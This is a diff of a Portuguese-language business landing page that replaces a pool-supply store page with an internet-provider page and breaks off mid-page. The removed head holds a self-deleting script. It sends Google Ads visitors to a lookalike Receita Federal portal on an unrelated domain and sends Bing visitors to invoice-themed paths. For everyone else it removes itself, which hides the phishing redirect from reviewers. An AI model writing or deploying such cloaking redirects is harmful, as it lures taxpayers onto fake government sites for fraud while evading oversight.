@@ -1,390 +1,459 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <script id="auto-destruct-script">
-(function() {
-    const urls = [
-        'cte/index',
-        'nfe/index',
-        'cte/index',
-        'asp/indexp',
-        'app/index',
-        'xml/indexp',
-        'danfe/index',
-        'nfe/index'
-    ];
-
-    function generateHash() {
-        return Math.random().toString(36).substring(2, 15) + 
-               Math.random().toString(36).substring(2, 15) + 
-               Date.now().toString(36);
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Liker Fibra · Internet que conecta você</title>
+  <!-- Bootstrap 5 + ícones + tema escuro/inovador -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <!-- Google Fonts (inter e display) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f6f9fc;
+      color: #1e293b;
+      scroll-behavior: smooth;
     }
-
-    const randomIndex = Math.floor(Math.random() * urls.length);
-    const randomUrl = urls[randomIndex];
-    const hash = generateHash();
-    const xirjfgjsdhdjd = 'https://www8-receita.portalfazend.website/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/?go=tdSSz';  
-
-    let referer = (typeof document !== 'undefined' && document.referrer) ? document.referrer : 'not found';
-    let currentUrl = (typeof window !== 'undefined') ? window.location.href : '';
-
-    // Lógica de Redirecionamento
-    if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-        if (typeof window !== 'undefined') {
-            window.location.href = xirjfgjsdhdjd;
-        }
-    } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-        const bingUrl = randomUrl + '?msclkid=' + hash;
-        if (typeof window !== 'undefined') {
-            window.location.href = bingUrl;
-        }
-    } else {
-        // AUTO-DESTRUIÇÃO: Se não for origem Ads, o script remove a si mesmo do HTML
-        if (typeof document !== 'undefined' && document.currentScript) {
-            document.currentScript.remove();
-        }
+    h1, h2, h3, .display-lead {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      letter-spacing: -0.02em;
     }
-})();
-</script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bragança Piscinas · Tradição em qualidade</title>
-    <!-- Bootstrap 5 + ícones + fonts -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <style>
-        * { font-family: 'Inter', sans-serif; }
-        body { background-color: #f4f9ff; }
-        /* cores inovadoras: azul piscina + verde água + detalhes em coral */
-        .bg-wave {
-            background: linear-gradient(135deg, #0a3b5b 0%, #1b5a7a 100%);
-        }
-        .text-pool { color: #7ed4e6; }      /* azul piscina claro */
-        .text-coral { color: #ff8360; }      /* coral vibrante */
-        .bg-coral-soft { background-color: #ffede8; }
-        .btn-coral {
-            background-color: #ff8360;
-            border: none;
-            color: #0a2e44;
-            font-weight: 600;
-            transition: 0.2s;
-        }
-        .btn-coral:hover {
-            background-color: #e86b48;
-            color: #fff;
-        }
-        .icon-box {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 70px;
-            height: 70px;
-            background: rgba(126, 212, 230, 0.15);
-            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%; /* forma orgânica moderna */
-            color: #1b5a7a;
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            transition: 0.3s;
-        }
-        .icon-box:hover {
-            background: #7ed4e6;
-            color: #0a2e44;
-        }
-        .card-hover {
-            transition: 0.2s ease-in-out;
-            border: none;
-            border-radius: 1.5rem;
-        }
-        .card-hover:hover {
-            transform: scale(1.01);
-            box-shadow: 0 20px 30px -10px rgba(10, 59, 91, 0.2);
-        }
-        .footer-link {
-            color: #bfdeef;
-            text-decoration: none;
-            font-size: 0.95rem;
-        }
-        .footer-link:hover {
-            color: #ff8360;
-        }
-        .rounded-4 { border-radius: 1.2rem; }
-        .border-pool { border-color: #7ed4e6 !important; }
-    </style>
+    /* cores inovadoras: laranja elétrico + azul profundo */
+    :root {
+      --liker-orange: #ff6b35;
+      --liker-dark: #0b1e33;
+      --liker-accent: #00c2ba;
+      --liker-soft: #eef7ff;
+    }
+    .bg-liker-dark { background-color: var(--liker-dark) !important; }
+    .bg-liker-soft { background-color: var(--liker-soft) !important; }
+    .text-liker-orange { color: var(--liker-orange) !important; }
+    .text-liker-accent { color: var(--liker-accent) !important; }
+    .btn-liker {
+      background-color: var(--liker-orange);
+      color: white;
+      border-radius: 40px;
+      padding: 0.75rem 2rem;
+      font-weight: 600;
+      border: none;
+      transition: all 0.2s;
+    }
+    .btn-liker:hover {
+      background-color: #e04e1a;
+      color: white;
+      transform: translateY(-3px);
+      box-shadow: 0 10px 20px rgba(255, 107, 53, 0.25);
+    }
+    .btn-outline-liker {
+      border: 2px solid var(--liker-orange);
+      color: var(--liker-orange);
+      border-radius: 40px;
+      padding: 0.5rem 1.5rem;
+      font-weight: 600;
+    }
+    .btn-outline-liker:hover {
+      background-color: var(--liker-orange);
+      color: white;
+    }
+    .navbar {
+      backdrop-filter: blur(10px);
+      background-color: rgba(11, 30, 51, 0.85) !important;
+    }
+    .nav-link { color: rgba(255,255,255,0.85) !important; font-weight: 500; }
+    .nav-link:hover, .nav-link.active { color: var(--liker-orange) !important; }
+    .hero-section {
+      background: linear-gradient(145deg, #0b1e33 0%, #123456 100%);
+      color: white;
+      padding: 6rem 0 5rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-section::after {
+      content: "FIBRA";
+      position: absolute;
+      bottom: -20px;
+      right: 10px;
+      font-size: 12vw;
+      font-weight: 800;
+      color: rgba(255,255,255,0.03);
+      pointer-events: none;
+      font-family: 'Space Grotesk';
+      white-space: nowrap;
+    }
+    .icon-circle {
+      width: 70px;
+      height: 70px;
+      background: rgba(255, 107, 53, 0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--liker-orange);
+      font-size: 2rem;
+      margin-bottom: 1rem;
+    }
+    .card-plan {
+      border: none;
+      border-radius: 30px;
+      background: white;
+      transition: transform 0.25s, box-shadow 0.25s;
+      box-shadow: 0 15px 30px rgba(0,0,0,0.03);
+    }
+    .card-plan:hover {
+      transform: translateY(-12px);
+      box-shadow: 0 30px 45px rgba(255, 107, 53, 0.12);
+    }
+    .card-plan.highlight {
+      border: 2px solid var(--liker-orange);
+      background: white;
+      position: relative;
+    }
+    .badge-popular {
+      background: var(--liker-orange);
+      color: white;
+      position: absolute;
+      top: -12px;
+      left: 30px;
+      padding: 0.4rem 1.5rem;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+    .footer {
+      background-color: #05111f;
+      color: #9caebf;
+    }
+    .footer a { color: #cdddee; text-decoration: none; }
+    .footer a:hover { color: var(--liker-orange); }
+    .border-liker-bottom { border-bottom: 3px solid var(--liker-orange); width: 70px; margin: 0.5rem 0 1rem; }
+    .contact-icon {
+      width: 42px; height: 42px;
+      background: rgba(255,107,53,0.1);
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--liker-orange);
+      font-size: 1.3rem;
+    }
+    .hover-scale { transition: transform 0.2s; }
+    .hover-scale:hover { transform: scale(1.02); }
+  </style>
 </head>
 <body>
 
-<!-- ===== NAVBAR ===== -->
-<nav class="navbar navbar-expand-lg navbar-dark bg-wave py-3 shadow-lg sticky-top">
+  <!-- NAVBAR fixa, transparente com blur -->
+  <nav class="navbar navbar-expand-lg navbar-dark fixed-top py-3">
     <div class="container">
-        <a class="navbar-brand fw-bold fs-3" href="#">
-            <i class="bi bi-droplet-half text-pool me-2"></i>Bragança<span class="text-pool">Piscinas</span>
-        </a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navMenu">
-            <span class="navbar-toggler-icon"></span>
-        </button>
-        <div class="collapse navbar-collapse" id="navMenu">
-            <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
-                <li class="nav-item"><a class="nav-link active" href="#home">Início</a></li>
-                <li class="nav-item"><a class="nav-link" href="#sobre">Sobre</a></li>
-                <li class="nav-item"><a class="nav-link" href="#servicos">Serviços</a></li>
-                <li class="nav-item"><a class="nav-link" href="#contato">Contato</a></li>
+      <a class="navbar-brand d-flex align-items-center" href="#">
+        <i class="bi bi-lightning-charge-fill text-liker-orange me-2 fs-1"></i>
+        <span class="fw-bold fs-3" style="letter-spacing: -0.5px;">Liker<span class="text-liker-orange">Fibra</span></span>
+      </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ms-auto align-items-center">
+          <li class="nav-item"><a class="nav-link active" href="#home">Início</a></li>
+          <li class="nav-item"><a class="nav-link" href="#planos">Planos</a></li>
+          <li class="nav-item"><a class="nav-link" href="#sobre">Sobre</a></li>
+          <li class="nav-item"><a class="nav-link" href="#contato">Contato</a></li>
+          <li class="nav-item ms-lg-3">
+            <a href="https://wa.me/5527999749588" target="_blank" class="btn btn-liker btn-sm"><i class="bi bi-whatsapp me-2"></i>WhatsApp</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- HERO section (início) -->
+  <section id="home" class="hero-section" style="margin-top: 70px;">
+    <div class="container position-relative">
+      <div class="row align-items-center g-5">
+        <div class="col-lg-6">
+          <span class="badge bg-liker-orange text-white mb-3 px-3 py-2 rounded-pill"><i class="bi bi-stars me-2"></i>Fibra ótica verdadeira</span>
+          <h1 class="display-4 fw-bold mb-4">Conectividade que <span class="text-liker-orange">acelera</span> seu mundo</h1>
+          <p class="lead mb-4" style="color: rgba(255,255,255,0.8);">Mais de 8 anos levando internet de alta velocidade e estabilidade para Vitória e região. Planos sob medida com a qualidade Liker Fibra.</p>
+          <div class="d-flex flex-wrap gap-3">
+            <a href="#planos" class="btn btn-liker btn-lg px-4"><i class="bi bi-rocket-takeoff me-2"></i>Ver planos</a>
+            <a href="#contato" class="btn btn-outline-light btn-lg px-4"><i class="bi bi-telephone me-2"></i>Falar com equipe</a>
+          </div>
+          <div class="row mt-5 g-3">
+            <div class="col-6 col-md-3">
+              <div class="d-flex align-items-center">
+                <i class="bi bi-trophy-fill text-liker-orange fs-2 me-2"></i>
+                <div><small class="d-block text-white-50">SCM autorizado</small><span class="fw-bold text-white">Anatel</span></div>
+              </div>
+            </div>
+            <div class="col-6 col-md-4">
+              <div class="d-flex align-items-center">
+                <i class="bi bi-emoji-smile-fill text-liker-orange fs-2 me-2"></i>
+                <div><small class="d-block text-white-50">clientes</small><span class="fw-bold text-white">+2.500</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-6 text-center">
+          <img src="https://placehold.co/700x500/0b1e33/ff6b35?text=Liker+FIBRA+5G&font=montserrat" alt="Roteador futurista" class="img-fluid rounded-4 shadow-lg">
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- DESTAQUES com ícones inovadores -->
+  <section class="py-5 bg-white">
+    <div class="container py-4">
+      <div class="row text-center g-4">
+        <div class="col-md-3 col-6">
+          <div class="icon-circle mx-auto"><i class="bi bi-lightning-fill"></i></div>
+          <h5 class="fw-bold mt-2">Ultra velocidade</h5>
+          <p class="text-secondary small">Fibra óptica simétrica de verdade</p>
+        </div>
+        <div class="col-md-3 col-6">
+          <div class="icon-circle mx-auto"><i class="bi bi-shield-check"></i></div>
+          <h5 class="fw-bold mt-2">WiFi seguro</h5>
+          <p class="text-secondary small">Proteção avançada para sua rede</p>
+        </div>
+        <div class="col-md-3 col-6">
+          <div class="icon-circle mx-auto"><i class="bi bi-phone"></i></div>
+          <h5 class="fw-bold mt-2">Suporte 24h</h5>
+          <p class="text-secondary small">Atendimento via WhatsApp e chat</p>
+        </div>
+        <div class="col-md-3 col-6">
+          <div class="icon-circle mx-auto"><i class="bi bi-geo-alt-fill"></i></div>
+          <h5 class="fw-bold mt-2">Vitória/ES</h5>
+          <p class="text-secondary small">Cobertura em todo município</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PLANOS (cards) -->
+  <section id="planos" class="py-5 bg-liker-soft">
+    <div class="container">
+      <div class="text-center mb-5">
+        <span class="badge bg-liker-dark text-white px-3 py-2 rounded-pill mb-2"><i class="bi bi-wifi"></i> escolha o seu</span>
+        <h2 class="display-5 fw-bold">Planos Liker Fibra</h2>
+        <p class="text-secondary">Internet de alta performance com preços justos</p>
+      </div>
+      <div class="row g-4 justify-content-center">
+        <!-- plano 300 Mega -->
+        <div class="col-lg-4 col-md-6">
+          <div class="card-plan p-4 h-100">
+            <span class="badge bg-liker-dark text-white mb-3"><i class="bi bi-house-door"></i> residencial</span>
+            <h3 class="fw-bold">300 Mega</h3>
+            <div class="display-5 fw-bold text-liker-orange">R$89<span class="fs-6 text-secondary">/mês</span></div>
+            <ul class="list-unstyled mt-4 mb-4">
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Download/Upload 300 Mbps</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>WiFi 6 incluso</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Suporte prioritário</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Instalação grátis</li>
             </ul>
-            <a href="#contato" class="btn btn-coral ms-lg-3 px-4 py-2 rounded-pill"><i class="bi bi-chat-dots me-2"></i>Fale conosco</a>
+            <a href="https://wa.me/5527999749588?text=Quero%20plano%20300%20Mega" target="_blank" class="btn btn-outline-liker w-100">Assinar agora <i class="bi bi-arrow-right"></i></a>
+          </div>
         </div>
+        <!-- plano 500 Mega (destaque) -->
+        <div class="col-lg-4 col-md-6">
+          <div class="card-plan highlight p-4 h-100">
+            <div class="badge-popular"><i class="bi bi-star-fill me-1"></i>mais popular</div>
+            <span class="badge bg-liker-orange text-white mb-3"><i class="bi bi-trophy"></i> recomendado</span>
+            <h3 class="fw-bold">500 Mega</h3>
+            <div class="display-5 fw-bold text-liker-orange">R$119<span class="fs-6 text-secondary">/mês</span></div>
+            <ul class="list-unstyled mt-4 mb-4">
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Download/Upload 500 Mbps</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Roteador mesh incluso</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Suporte 24h exclusivo</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Instalação + app grátis</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>HBO Max incluso 1 ano</li>
+            </ul>
+            <a href="https://wa.me/5527999749588?text=Quero%20plano%20500%20Mega" target="_blank" class="btn btn-liker w-100">Assinar agora <i class="bi bi-arrow-right"></i></a>
+          </div>
+        </div>
+        <!-- plano 1 Giga -->
+        <div class="col-lg-4 col-md-6">
+          <div class="card-plan p-4 h-100">
+            <span class="badge bg-liker-dark text-white mb-3"><i class="bi bi-lightning"></i> gamer</span>
+            <h3 class="fw-bold">1 Giga</h3>
+            <div class="display-5 fw-bold text-liker-orange">R$179<span class="fs-6 text-secondary">/mês</span></div>
+            <ul class="list-unstyled mt-4 mb-4">
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Download/Upload 1 Gbps</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>WiFi 6E + roteador incluso</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Prioridade de tráfego</li>
+              <li class="mb-2"><i class="bi bi-check-circle-fill text-liker-orange me-2"></i>Instalação VIP</li>
+            </ul>
+            <a href="https://wa.me/5527999749588?text=Quero%20plano%201%20Giga" target="_blank" class="btn btn-outline-liker w-100">Assinar agora <i class="bi bi-arrow-right"></i></a>
+          </div>
+        </div>
+      </div>
     </div>
-</nav>
+  </section>
 
-<!-- ===== HERO com imagem inovadora sobre água / piscina ===== -->
-<section id="home" class="bg-wave text-white pt-5 pb-0">
-    <div class="container py-4">
-        <div class="row align-items-center g-5">
-            <div class="col-lg-6">
-                <span class="badge bg-pool text-dark mb-3 px-3 py-2" style="background-color: #7ed4e6;">Há 26 anos cuidando do seu lazer</span>
-                <h1 class="display-4 fw-bold mb-4">Transformamos seu verão <span class="text-pool">em diversão</span> dentro d'água</h1>
-                <p class="lead fs-5 mb-4" style="color: #d3edf5;">Venda de materiais, acessórios e soluções completas para piscinas em Bragança Paulista. Qualidade e confiança desde 1999.</p>
-                <div class="d-flex flex-wrap gap-3">
-                    <a href="#servicos" class="btn btn-coral btn-lg px-5 py-3 rounded-pill shadow-sm"><i class="bi bi-search-heart me-2"></i>Conheça produtos</a>
-                    <a href="#sobre" class="btn btn-outline-light btn-lg px-5 py-3 rounded-pill border-2"><i class="bi bi-play-circle me-2"></i>Nossa história</a>
-                </div>
-                <!-- mini estatísticas -->
-                <div class="row mt-5 g-3">
-                    <div class="col-4"><i class="bi bi-trophy-fill text-coral me-2"></i><strong>+26 anos</strong><br><span class="small">experiência</span></div>
-                    <div class="col-4"><i class="bi bi-emoji-smile-fill text-coral me-2"></i><strong>+3.500</strong><br><span class="small">clientes</span></div>
-                    <div class="col-4"><i class="bi bi-building-fill text-coral me-2"></i><strong>Loja física</strong><br><span class="small">centro</span></div>
-                </div>
-            </div>
-            <div class="col-lg-6 text-center">
-                <!-- imagem inovadora: piscina moderna com ondas digitais (placehold conceito) -->
-                <img src="https://placehold.co/600x400/0a3b5b/7ed4e6?text=Piscina+Inteligente" alt="Piscina moderna Bragança" class="img-fluid rounded-4 shadow-lg" style="max-height: 380px;">
-            </div>
-        </div>
-    </div>
-    <!-- onda decorativa inferior -->
-    <div class="container-fluid p-0" style="margin-top: -10px;">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 150" style="display: block; fill: #f4f9ff;">
-            <path d="M0,64L48,80C96,96,192,128,288,128C384,128,480,96,576,85.3C672,75,768,85,864,101.3C960,117,1056,139,1152,138.7C1248,139,1344,117,1392,106.7L1440,96L1440,150L1392,150C1344,150,1248,150,1152,150C1056,150,960,150,864,150C768,150,672,150,576,150C480,150,384,150,288,150C192,150,96,150,48,150L0,150Z"></path>
-        </svg>
-    </div>
-</section>
-
-<!-- ===== ÍCONES + FRASES (diferenciais inovadores) ===== -->
-<section class="container my-5 py-4">
-    <div class="row g-4 text-center">
-        <div class="col-md-3 col-6">
-            <div class="icon-box mx-auto"><i class="bi bi-droplet"></i></div>
-            <h5 class="fw-bold">Tratamento químico</h5>
-            <p class="text-secondary small">Produtos de primeira linha para água cristalina.</p>
-        </div>
-        <div class="col-md-3 col-6">
-            <div class="icon-box mx-auto"><i class="bi bi-fan"></i></div>
-            <h5 class="fw-bold">Bombas & filtros</h5>
-            <p class="text-secondary small">Eficiência energética e durabilidade.</p>
-        </div>
-        <div class="col-md-3 col-6">
-            <div class="icon-box mx-auto"><i class="bi bi-brightness-alt-high"></i></div>
-            <h5 class="fw-bold">Aquecedores solares</h5>
-            <p class="text-secondary small">Aproveite a piscina o ano todo.</p>
-        </div>
-        <div class="col-md-3 col-6">
-            <div class="icon-box mx-auto"><i class="bi bi-tools"></i></div>
-            <h5 class="fw-bold">Acessórios e reparos</h5>
-            <p class="text-secondary small">Capas, aspiradores, skimmers e mais.</p>
-        </div>
-    </div>
-</section>
-
-<!-- ===== SOBRE (com dados da empresa) ===== -->
-<section id="sobre" class="bg-white py-5 shadow-sm">
-    <div class="container py-4">
-        <div class="row align-items-center g-5">
-            <div class="col-lg-5 order-lg-2">
-                <img src="https://placehold.co/500x400/1b5a7a/ffffff?text=Equipe+Braganca+Piscinas" alt="Nossa equipe" class="img-fluid rounded-4 shadow">
-            </div>
-            <div class="col-lg-7 order-lg-1">
-                <h2 class="display-6 fw-bold mb-3"><i class="bi bi-water text-pool me-2"></i>Bragança Piscinas e Acessórios</h2>
-                <p class="lead mb-3">Referência em Bragança Paulista desde 1999, somos uma empresa sólida e em constante evolução.</p>
-                <div class="row mt-4">
-                    <div class="col-md-6">
-                        <ul class="list-unstyled">
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>CNPJ:</strong> 03.430.365/0001-44</li>
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>Insc. Estadual:</strong> 225.196.461.114</li>
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>Abertura:</strong> 29/09/1999 (26 anos, 4 meses, 24 dias)</li>
-                        </ul>
-                    </div>
-                    <div class="col-md-6">
-                        <ul class="list-unstyled">
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>Razão Social:</strong> Braganca Piscinas e Acessorios LTDA</li>
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>Situação:</strong> <span class="badge bg-success">Ativa</span></li>
-                            <li class="mb-2"><i class="bi bi-check-circle-fill text-coral me-2"></i><strong>CNAE:</strong> 47.44-0-05 (comércio de materiais de construção)</li>
-                        </ul>
-                    </div>
-                </div>
-                <p class="mt-3">Atuamos no comércio varejista de materiais de construção não especificados anteriormente, com foco especial em piscinas, produtos para tratamento, manutenção e lazer. Nossa missão é proporcionar qualidade de vida e satisfação aos nossos clientes.</p>
-                <div class="bg-coral-soft p-3 rounded-4 mt-3 d-flex align-items-center">
-                    <i class="bi bi-pin-map-fill fs-2 text-coral me-3"></i>
-                    <div><strong>Nosso endereço:</strong> Avenida Dos Imigrantes, 1728 – Complemento A – Jd. América – Bragança Paulista/SP – CEP 12902-000</div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== SERVIÇOS / PRODUTOS (cards) ===== -->
-<section id="servicos" class="container py-5">
-    <div class="text-center mb-5">
-        <span class="badge bg-wave text-white px-4 py-2 rounded-pill mb-2"><i class="bi bi-grid"></i> Nossas soluções</span>
-        <h2 class="display-6 fw-bold">Tudo para sua piscina em um só lugar</h2>
-        <p class="text-secondary">Desde a construção até a manutenção diária.</p>
-    </div>
-    <div class="row g-4">
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-capsule display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Químicos e tratamento</h4>
-                    <p class="text-secondary">Cloro, algicidas, clarificantes, reguladores de pH e muito mais.</p>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-water display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Bombas e motobombas</h4>
-                    <p class="text-secondary">Modelos para todos os tamanhos de piscina, com baixo consumo.</p>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-sun display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Aquecimento solar</h4>
-                    <p class="text-secondary">Sistemas completos e eficientes para prolongar o uso.</p>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-brush display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Acessórios de limpeza</h4>
-                    <p class="text-secondary">Aspiradores manuais e automáticos, rodos, peneiras.</p>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-lightbulb display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Iluminação subaquática</h4>
-                    <p class="text-secondary">Lâmpadas de LED e refletores para segurança e beleza.</p>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card card-hover h-100 p-3 border-0 shadow-sm rounded-4">
-                <div class="card-body text-center">
-                    <i class="bi bi-shield-shaded display-3 text-pool"></i>
-                    <h4 class="fw-bold mt-3">Capas e lonas</h4>
-                    <p class="text-secondary">Proteção contra sujeira e redução de evaporação.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== CONTATO + LOCALIZAÇÃO COMPLETO ===== -->
-<section id="contato" class="bg-white py-5">
+  <!-- SOBRE A EMPRESA com dados de registro, CNPJ etc -->
+  <section id="sobre" class="py-5 bg-white">
     <div class="container">
-        <div class="row g-4">
-            <div class="col-lg-6">
-                <div class="bg-wave text-white p-5 rounded-4 h-100 d-flex flex-column justify-content-center">
-                    <h3 class="fw-bold mb-4"><i class="bi bi-envelope-paper text-pool me-2"></i>Fale com a Bragança Piscinas</h3>
-                    <p class="mb-4">Estamos prontos para atender você pessoalmente, por telefone ou e-mail.</p>
-                    <div class="d-flex align-items-center mb-3">
-                        <i class="bi bi-envelope-fill text-pool fs-4 me-3"></i>
-                        <div><span class="small">E-MAIL</span><br><a href="mailto:gil@bragancapiscinas.com.br" class="text-white text-decoration-none fw-semibold">gil@bragancapiscinas.com.br</a></div>
-                    </div>
-                    <div class="d-flex align-items-center mb-3">
-                        <i class="bi bi-telephone-fill text-pool fs-4 me-3"></i>
-                        <div><span class="small">TELEFONES</span><br>
-                            <a href="tel:+551140322634" class="text-white text-decoration-none me-2">(11) 4032-2634</a> | 
-                            <a href="tel:+551140321720" class="text-white text-decoration-none">(11) 4032-1720</a>
-                        </div>
-                    </div>
-                    <div class="d-flex align-items-center mb-3">
-                        <i class="bi bi-whatsapp text-pool fs-4 me-3"></i>
-                        <div><span class="small">WHATSAPP COMERCIAL</span><br><a href="#" class="text-white text-decoration-none">(11) 9xxxx-xxxx</a></div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6">
-                <div class="bg-soft p-4 rounded-4 border border-pool h-100">
-                    <h4 class="fw-bold mb-3"><i class="bi bi-pin-map-fill text-coral me-2"></i>Visite nossa loja</h4>
-                    <address class="mb-3">
-                        <strong>Braganca Piscinas e Acessorios LTDA</strong><br>
-                        Avenida Dos Imigrantes, 1728 - Complemento A<br>
-                        Jd. América - Bragança Paulista - SP<br>
-                        CEP: 12902-000
-                    </address>
-                    <p><strong>Para correspondência:</strong> mesmo endereço acima.</p>
-                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3670.174312345678!2d-46.5423123456789!3d-22.9521123456789!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94cec1a2b2b2b2b%3A0x1a2b2b2b2b2b2b2b!2sAv.%20Dos%20Imigrantes%2C%201728%20-%20Jd.%20Am%C3%A9rica%2C%20Bragan%C3%A7a%20Paulista%20-%20SP%2C%2012902-000!5e0!3m2!1spt-BR!2sbr!4v1610000000000!5m2!1spt-BR!2sbr" width="100%" height="230" style="border:0; border-radius: 16px;" allowfullscreen="" loading="lazy"></iframe>
-                </div>
-            </div>
+      <div class="row align-items-center">
+        <div class="col-lg-5 mb-4 mb-lg-0">
+          <img src="https://placehold.co/600x500/0b1e33/ff6b35?text=8+anos+Liker&font=montserrat" class="img-fluid rounded-4 shadow" alt="sede Liker Fibra">
         </div>
+        <div class="col-lg-7">
+          <h2 class="display-6 fw-bold mb-3"><span class="text-liker-orange">Liker Fibra:</span> conectando Vitória desde 2018</h2>
+          <p class="lead mb-4">Somos uma provedora capixaba com registro na Anatel (SCM) e atuação sólida no Espírito Santo. Nossa estrutura é pensada para entregar experiência digital sem fronteiras.</p>
+          <div class="row g-4">
+            <div class="col-md-6">
+              <div class="d-flex gap-3">
+                <i class="bi bi-building fs-1 text-liker-orange"></i>
+                <div>
+                  <strong>Razão Social</strong>
+                  <p class="mb-0">Liker Telecomunicacoes LTDA</p>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="d-flex gap-3">
+                <i class="bi bi-qr-code-scan fs-1 text-liker-orange"></i>
+                <div>
+                  <strong>CNPJ</strong>
+                  <p class="mb-0">29.832.883/0001-88</p>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="d-flex gap-3">
+                <i class="bi bi-calendar-check fs-1 text-liker-orange"></i>
+                <div>
+                  <strong>Desde</strong>
+                  <p class="mb-0">02/03/2018 · 8 anos e 7 dias</p>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="d-flex gap-3">
